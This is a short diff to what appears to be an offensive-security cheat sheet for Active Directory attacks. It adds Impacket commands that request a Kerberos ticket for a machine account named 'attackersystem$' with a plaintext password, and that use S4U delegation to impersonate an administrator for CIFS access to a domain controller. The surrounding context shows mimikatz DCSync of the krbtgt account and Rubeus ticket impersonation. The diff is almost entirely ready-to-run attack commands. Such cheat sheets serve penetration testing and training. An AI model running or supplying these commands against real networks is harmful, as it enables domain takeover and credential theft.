@@ -2425,6 +2425,12 @@ Covenant
 > ImpersonateProcess 1116
 ```
 
+Impacket
+
+```
+getTGT.py -dc-ip 10.9.0.1 'vault.local/attackersystem$:Summer2018!'
+```
+
 ### Process Injection
 
 ```
@@ -3054,6 +3060,9 @@ mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
 
 # impersonate and modify service
 .\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt /ticket:[...] /altservice:cifs
+
+# impacket impersonate 
+getST.py -dc-ip 10.9.0.1 -spn 'cifs/dc.vault.local' -impersonate 'administrat' 'vault.local/attackersystem$:Summer2018!'
 ```
 
 ### Resource Based Constrained Delegation (RBCD)
